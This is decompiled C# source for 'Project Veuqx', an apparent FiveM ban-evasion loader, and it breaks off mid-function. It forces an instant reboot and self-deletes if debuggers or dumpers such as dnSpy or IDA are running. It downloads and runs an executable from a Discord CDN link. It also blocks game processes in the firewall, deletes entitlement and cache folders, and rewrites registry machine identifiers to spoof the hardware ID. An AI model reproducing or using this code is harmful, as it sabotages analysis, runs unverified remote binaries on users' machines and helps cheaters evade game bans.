using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Loader.Properties;
using Microsoft.Win32;
using Siticone.UI.AnimatorNS;
using Siticone.UI.WinForms;

namespace KeyAuth
{
	// Token: 0x02000006 RID: 6
	public partial class Main : Form
	{
		// Token: 0x06000036 RID: 54 RVA: 0x00003DBC File Offset: 0x00003DBC
		private static void DimisProtection()
		{
			bool flag = Process.GetProcessesByName("dnSpy").Length != 0;
			if (flag)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			bool flag2 = Process.GetProcessesByName("ExtremeDumper").Length != 0;
			if (flag2)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			bool flag3 = Process.GetProcessesByName("ExtremeDumper-x86").Length != 0;
			if (flag3)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			bool flag4 = Process.GetProcessesByName("ida64").Length != 0;
			if (flag4)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			bool flag5 = Process.GetProcessesByName("64dbg").Length != 0;
			if (flag5)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			bool flag6 = Process.GetProcessesByName("ollydbg").Length != 0;
			if (flag6)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			bool flag7 = Process.GetProcessesByName("x32dbg").Length != 0;
			if (flag7)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			bool flag8 = Process.GetProcessesByName("MasterDumper").Length == 0;
			if (!flag8)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
		}

		// Token: 0x06000037 RID: 55
		[DllImport("Gdi32.dll")]
		private static extern IntPtr CreateRoundRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidthEllipse, int nHeightEllipse);

		// Token: 0x06000038 RID: 56 RVA: 0x000040DC File Offset: 0x000040DC
		public Main()
		{
			string[,] array = new string[6, 7];
			array[0, 0] = "SystemProductName";
			array[0, 1] = "Identifier";
			array[0, 2] = "Previous Update Revision";
			array[0, 3] = "ProcessorNameString";
			array[0, 4] = "VendorIdentifier";
			array[0, 5] = "Platform Specific Field1";
			array[0, 6] = "Component Information";
			array[1, 0] = "SerialNumber";
			array[1, 1] = "Identifier";
			array[1, 2] = "SystemManufacturer";
			array[1, 3] = "nop";
			array[1, 4] = "nop";
			array[1, 5] = "nop";
			array[1, 6] = "nop";
			array[2, 0] = "ComputerHardwareId";
			array[2, 1] = "ComputerHardwareIds";
			array[2, 2] = "BIOSVendor";
			array[2, 3] = "ProductId";
			array[2, 4] = "ProcessorNameString";
			array[2, 5] = "BIOSReleaseDate";
			array[2, 6] = "nop";
			array[3, 0] = "ProductId";
			array[3, 1] = "InstallDate";
			array[3, 2] = "InstallTime";
			array[3, 3] = "nop";
			array[3, 4] = "nop";
			array[3, 5] = "nop";
			array[3, 6] = "nop";
			array[4, 0] = "SusClientId";
			array[4, 1] = "nop";
			array[4, 2] = "nop";
			array[4, 3] = "nop";
			array[4, 4] = "nop";
			array[4, 5] = "nop";
			array[4, 6] = "nop";
			array[5, 0] = "BaseBoardManufacturer";
			array[5, 1] = "BaseBoardProduct";
			array[5, 2] = "BIOSVersion";
			array[5, 3] = "nop";
			array[5, 4] = "SystemManufacturer";
			array[5, 5] = "SystemProductName";
			array[5, 6] = "nop";
			this.ValuesKeysHWID = array;
			this.processlist = new List<Process>();
			this.components = null;
			
			this.InitializeComponent();
			base.FormBorderStyle = FormBorderStyle.None;
			base.Region = Region.FromHrgn(Main.CreateRoundRectRgn(0, 0, base.Width, base.Height, 30, 30));
		}

		// Token: 0x06000039 RID: 57 RVA: 0x000043AB File Offset: 0x000043AB
		private void siticoneControlBox3_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600003A RID: 58 RVA: 0x000043AE File Offset: 0x000043AE
		private void label1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600003B RID: 59 RVA: 0x000043B1 File Offset: 0x000043B1
		private void guna2Button8_Click(object sender, EventArgs e)
		{
			Process.Start("https://cdn.discordapp.com/attachments/846009434086178886/1018972521313353749/Methods_l_Project_Veuqx.rar");
		}

		// Token: 0x0600003C RID: 60 RVA: 0x000043C0 File Offset: 0x000043C0
		private void guna2Button7_Click(object sender, EventArgs e)
		{
			Login login = new Login();
			login.Show();
			base.Hide();
			MessageBox.Show("Successfully Logout!", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		// Token: 0x0600003D RID: 61 RVA: 0x000043F8 File Offset: 0x000043F8
		public DateTime UnixTimeToDateTime(long unixtime)
		{
			DateTime result = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local);
			result = result.AddSeconds((double)unixtime).ToLocalTime();
			return result;
		}

		// Token: 0x0600003E RID: 62 RVA: 0x00004430 File Offset: 0x00004430
		private void guna2Button20_Click(object sender, EventArgs e)
		{
			MessageBox.Show("Your Have New Version.", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		// Token: 0x0600003F RID: 63 RVA: 0x00004448 File Offset: 0x00004448
		public static bool SubExist(string name, int len)
		{
			for (int i = 0; i < len; i++)
			{
				bool flag = Login.KeyAuthApp.user_data.subscriptions[i].subscription == name;
				if (flag)
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x06000040 RID: 64 RVA: 0x00004498 File Offset: 0x00004498
		public static bool IsAdministrator()
		{
			return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
		}

		// Token: 0x06000041 RID: 65 RVA: 0x000044BE File Offset: 0x000044BE
		private void siticoneControlBox1_Click(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		// Token: 0x06000042 RID: 66 RVA: 0x000044C8 File Offset: 0x000044C8
		private void guna2Button25_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000043 RID: 67 RVA: 0x000044CB File Offset: 0x000044CB
		private void fivem_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000044 RID: 68 RVA: 0x000044CE File Offset: 0x000044CE
		private void game_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000045 RID: 69 RVA: 0x000044D1 File Offset: 0x000044D1
		private void dash_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000046 RID: 70 RVA: 0x000044D4 File Offset: 0x000044D4
		private void guna2Panel2_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000047 RID: 71 RVA: 0x000044D7 File Offset: 0x000044D7
		private void guna2Panel6_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000048 RID: 72 RVA: 0x000044DA File Offset: 0x000044DA
		private void guna2Button24_Click_1(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		// Token: 0x06000049 RID: 73 RVA: 0x000044E4 File Offset: 0x000044E4
		private void guna2Button24_Click_2(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		// Token: 0x0600004A RID: 74 RVA: 0x000044EE File Offset: 0x000044EE
		private void guna2Button6_Click(object sender, EventArgs e)
		{
			MessageBox.Show("Coming Soon", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x0600004B RID: 75 RVA: 0x00004504 File Offset: 0x00004504
		private void guna2Button31_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004C RID: 76 RVA: 0x00004507 File Offset: 0x00004507
		private void last_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004D RID: 77 RVA: 0x0000450A File Offset: 0x0000450A
		private void games_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600004E RID: 78 RVA: 0x0000450D File Offset: 0x0000450D
		private void guna2Button19_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004F RID: 79 RVA: 0x00004510 File Offset: 0x00004510
		private void guna2Button32_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000050 RID: 80 RVA: 0x00004513 File Offset: 0x00004513
		private void label1_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x06000051 RID: 81 RVA: 0x00004516 File Offset: 0x00004516
		private void guna2Button27_Click(object sender, EventArgs e)
		{
			Process.Start("Fivem.exe");
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00004524 File Offset: 0x00004524
		private void guna2Button19_Click(object sender, EventArgs e)
		{
			Process.Start("https://discord.gg/GhpaRcupHk");
		}

		// Token: 0x06000053 RID: 83 RVA: 0x00004534 File Offset: 0x00004534
		private void Main_Load(object sender, EventArgs e)
		{
			Login.KeyAuthApp.check();
			this.username.Text = "Username: " + Login.KeyAuthApp.user_data.username;
			this.version1.Text = "Version: " + Login.KeyAuthApp.app_data.version;
			this.ip1.Text = "IP Adress: " + Login.KeyAuthApp.user_data.ip;
			this.hwid1.Text = "HWID: " + Login.KeyAuthApp.user_data.hwid;
			this.zeit.Text = "Expiry: Lifetime";
			this.last.Text = "Last Login: " + this.UnixTimeToDateTime(long.Parse(Login.KeyAuthApp.user_data.lastlogin)).ToString();
		}

		// Token: 0x06000054 RID: 84 RVA: 0x0000462C File Offset: 0x0000462C
		private void blockconnection(string args)
		{
			new Process
			{
				StartInfo = 
				{
					FileName = "cmd.exe",
					CreateNoWindow = true,
					RedirectStandardInput = true,
					RedirectStandardOutput = true,
					UseShellExecute = false,
					Verb = "runas",
					Arguments = "/C " + args
				}
			}.Start();
		}

		// Token: 0x06000055 RID: 85 RVA: 0x000046B4 File Offset: 0x000046B4
		private void guna2Button21_Click(object sender, EventArgs e)
		{
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveM2372Block\" dir=in action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveM2372Block\" dir=out action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2372Block\" dir=in new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2372Block\" dir=out new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveMSteamBlock\" dir=in action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_SteamChild.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveMSteamBlock\" dir=out action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_SteamChild.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveMSteamBlock\" dir=in new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveMSteamBlock\" dir=out new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveMRockstarBlock\" dir=in action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_GTAProcess.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveMRockstarBlock\" dir=out action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_GTAProcess.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveMRockstarBlock\" dir=in new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveMRockstarBlock\" dir=out new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveM2189Block\" dir=in action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2189_GTAProcess.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveM2189Block\" dir=out action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2189_GTAProcess.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2189Block\" dir=in new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2189Block\" dir=out new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveM2060Block\" dir=in action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2060_gtaprocess.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveM2060Block\" dir=out action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2060_gtaprocess.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2060Block\" dir=in new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2060Block\" dir=out new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveM2545Block\" dir=in action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2545_gtaprocess.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveM2545Block\" dir=out action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2545_gtaprocess.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2545Block\" dir=in new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2545Block\" dir=out new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveM1604Block\" dir=in action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b1604_gtaprocess.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveM1604Block\" dir=out action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b1604_gtaprocess.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM1604Block\" dir=in new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM1604Block\" dir=out new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveM2372Block\" dir=in action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2372_GTAProcess.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveM2372Block\" dir=out action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_GTAProcess.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2372Block\" dir=in new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2372Block\" dir=out new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveMSteamBlock\" dir=in action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_SteamChild.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveMSteamBlock\" dir=out action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_SteamChild.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveMSteamBlock\" dir=in new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveMSteamBlock\" dir=out new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveMRockstarBlock\" dir=in action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_GTAProcess.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveMRockstarBlock\" dir=out action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_GTAProcess.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveMRockstarBlock\" dir=in new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveMRockstarBlock\" dir=out new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveM2189Block\" dir=in action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2189_GTAProcess.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveM2189Block\" dir=out action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2189_GTAProcess.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2189Block\" dir=in new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2189Block\" dir=out new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveM2060Block\" dir=in action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2060_GTAProcess.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveM2060Block\" dir=out action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2060_GTAProcess.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2060Block\" dir=in new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2060Block\" dir=out new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveM2545Block\" dir=in action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2545_GTAProcess\" > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveM2545Block\" dir=out action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2545_GTAProcess\" > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2545Block\" dir=in new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2545Block\" dir=out new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveM1604Block\" dir=in action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b1604_GTAProcess.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall add rule name=\"FiveM1604Block\" dir=out action=block profile=any program=\"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b1604_GTAProcess.exe\" > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM1604Block\" dir=in new enable=yes > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM1604Block\" dir=out new enable=yes > nul");
			MessageBox.Show("Enabled", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00004978 File Offset: 0x00004978
		private void guna2Button22_Click(object sender, EventArgs e)
		{
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2372Block\" dir=in new enable=no > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2372Block\" dir=out new enable=no > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveMSteamBlock\" dir=in new enable=no > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveMSteamBlock\" dir=out new enable=no > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveMRockstarBlock\" dir =in new enable= no > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveMRockstarBlock\" dir=out new enable=no > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2189Block\" dir=in new enable=no > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2189Block\" dir=out new enable=no > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2060Block\" dir=in new enable=no > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2060Block\" dir=out new enable=no > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2545Block\" dir=in new enable=no > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM2545Block\" dir=out new enable=no > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM1604Block\" dir=in new enable=no > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveM1604Block\" dir=out new enable=no > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveMROSServiceBlock\" dir=in new enable=no > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveMROSServiceBlock\" dir=out new enable=no > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveMChromeBrowser\" dir=in new enable=no > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveMChromeBrowser\" dir=out new enable=no > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveMROSLauncher\" dir=in new enable=no > nul");
			this.blockconnection("netsh advfirewall firewall set rule name=\"FiveMROSLauncher\" dir=out new enable=no > nul");
			MessageBox.Show("Disabled", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		// Token: 0x06000057 RID: 87 RVA: 0x00004A8C File Offset: 0x00004A8C
		private void guna2Button23_Click(object sender, EventArgs e)
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string processName = "FiveM";
			string processName2 = "Steam";
			Process process = Process.GetProcessesByName(processName).FirstOrDefault<Process>();
			bool flag = process != null;
			if (flag)
			{
				process.CloseMainWindow();
				process.Kill();
				process.WaitForExit();
				process.Dispose();
			}
			Process process2 = Process.GetProcessesByName(processName2).FirstOrDefault<Process>();
			bool flag2 = process2 != null;
			if (flag2)
			{
				process2.CloseMainWindow();
				process2.Kill();
				process2.WaitForExit();
				process2.Dispose();
			}
			bool flag3 = !File.Exists(folderPath + "\\FiveM\\FiveM.exe");
			if (flag3)
			{
				Console.Beep();
				MessageBox.Show("Failed", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				DialogResult dialogResult = MessageBox.Show("You want us to fix it for you?", "Project Veuqx", MessageBoxButtons.YesNo);
				bool flag4 = dialogResult == DialogResult.Yes;
				if (flag4)
				{
					bool flag5 = Directory.Exists(folderPath + "\\FiveM");
					if (flag5)
					{
						Directory.Delete(folderPath + "\\FiveM", false);
					}
					bool flag6 = !Directory.Exists(folderPath + "\\FiveM");
					if (flag6)
					{
						Directory.CreateDirectory(folderPath + "\\FiveM");
					}
					using (WebClient webClient = new WebClient())
					{
						webClient.DownloadFile("https://cdn.discordapp.com/attachments/950112367767851102/962261956880891924/FiveM.exe", folderPath + "\\FiveM\\FiveM.exe");
						Process.Start(folderPath + "\\FiveM\\FiveM.exe");
						MessageBox.Show("Downloaded and Started");
					}
				}
			}
			else
			{
				bool flag7 = Directory.Exists(folderPath + "\\DigitalEntitlements");
				if (flag7)
				{
					Directory.Delete(folderPath + "\\DigitalEntitlements", true);
				}
				bool flag8 = Directory.Exists(folderPath + "\\FiveM\\FiveM Application Data\\crashes");
				if (flag8)
				{
					Directory.Delete(folderPath + "\\FiveM\\FiveM Application Data\\crashes", true);
				}
				bool flag9 = Directory.Exists(folderPath + "\\FiveM\\FiveM Application Data\\logs");
				if (flag9)
				{
					Directory.Delete(folderPath + "\\FiveM\\FiveM Application Data\\logs", true);
				}
				bool flag10 = Directory.Exists(folderPath + "\\FiveM\\FiveM Application Data\\data\\cache");
				if (flag10)
				{
					Directory.Delete(folderPath + "\\FiveM\\FiveM Application Data\\data\\cache", true);
				}
				bool flag11 = Directory.Exists(folderPath + "\\FiveM\\FiveM Application Data\\data\\server-cache");
				if (flag11)
				{
					Directory.Delete(folderPath + "\\FiveM\\FiveM Application Data\\data\\server-cache", true);
				}
				bool flag12 = Directory.Exists(folderPath2 + "\\CitizenFX");
				if (flag12)
				{
					Directory.Delete(folderPath2 + "\\CitizenFX", true);
				}
				MessageBox.Show("Successfully", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
		}

		// Token: 0x06000058 RID: 88 RVA: 0x00004D48 File Offset: 0x00004D48
		public static string GenID(int length)
		{
			string element = "123456789";
			return new string((from s in Enumerable.Repeat<string>(element, length)
			select s[Main.random.Next(s.Length)]).ToArray<char>());
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00004D98 File Offset: 0x00004D98
		public static string RandomId(int length)
		{
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			string text2 = "";
			Random random = new Random();
			for (int i = 0; i < length; i++)
			{
				text2 += text[random.Next(text.Length)].ToString();
			}
			return text2;
		}

		// Token: 0x0600005A RID: 90 RVA: 0x00004DF5 File Offset: 0x00004DF5
		private void system_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600005B RID: 91 RVA: 0x00004DF8 File Offset: 0x00004DF8
		private void guna2Button17_Click(object sender, EventArgs e)
		{
			bool flag = MessageBox.Show("Do you want to restart your PC Now?", "Project Veuqx", MessageBoxButtons.YesNo) != DialogResult.Yes;
			if (!flag)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", true);
				registryKey.SetValue("ComputerName", "PROJECT-VEUQX");
				registryKey.Close();
				RegistryKey registryKey2 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters", true);
				registryKey2.SetValue("NV Hostname", "PROJECT-VEUQX");
				registryKey2.Close();
				RegistryKey registryKey3 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters", true);
				registryKey3.SetValue("Hostname", "PROJECT-VEUQX");
				registryKey3.Close();
				RegistryKey registryKey4 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName", true);
				registryKey4.SetValue("ComputerName", "PROJECT-VEUQX");
				registryKey4.Close();
				string name = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
				using (RegistryKey registryKey5 = Registry.CurrentUser.OpenSubKey(name, true))
				{
					registryKey5.DeleteSubKeyTree("RegisteredOwner", false);
				}
				RegistryKey registryKey6 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
				registryKey6.SetValue("RegisteredOwner", "PROJECT-VEUQX");
				registryKey6.Close();
			}
		}

		// Token: 0x0600005C RID: 92 RVA: 0x00004F9C File Offset: 0x00004F9C
		private static string GenerateID(int i)
		{
			return i.ToString().PadLeft(4, '0');
		}

		// Token: 0x0600005D RID: 93 RVA: 0x00004FC0 File Offset: 0x00004FC0
		public static string GenerateRandomMAC()
		{
			Random random = new Random((int)DateTime.Now.ToFileTimeUtc());
			string text = "0123456789ABCDEF";
			string text2 = "";
			for (int i = 1; i < 12; i++)
			{
				text2 += text[random.Next(0, 15)].ToString();
			}
			return text2;
		}

		// Token: 0x0600005E RID: 94 RVA: 0x00005030 File Offset: 0x00005030
		private bool DisableNetworkDriver()
		{
			try
			{
